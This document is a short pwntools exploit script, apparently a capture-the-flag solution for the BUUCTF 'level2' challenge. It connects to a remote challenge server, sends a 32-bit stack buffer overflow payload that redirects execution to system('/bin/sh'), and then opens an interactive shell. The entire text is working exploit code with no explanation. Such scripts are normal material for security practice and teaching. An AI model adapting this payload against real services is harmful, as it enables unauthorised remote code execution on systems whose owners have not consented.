from pwn import *

p = remote("node4.buuoj.cn",25980)
context.log_level = "debug"
elf = ELF("./level2")

sys_addr = elf.symbols['system']
bin_sh = 0x804A024

payload = b'a'*(0x88 + 4) + p32(sys_addr) + p32(0) + p32(bin_sh)
#p.recvuntil("Input:\n")
p.sendline(payload)

p.interactive()
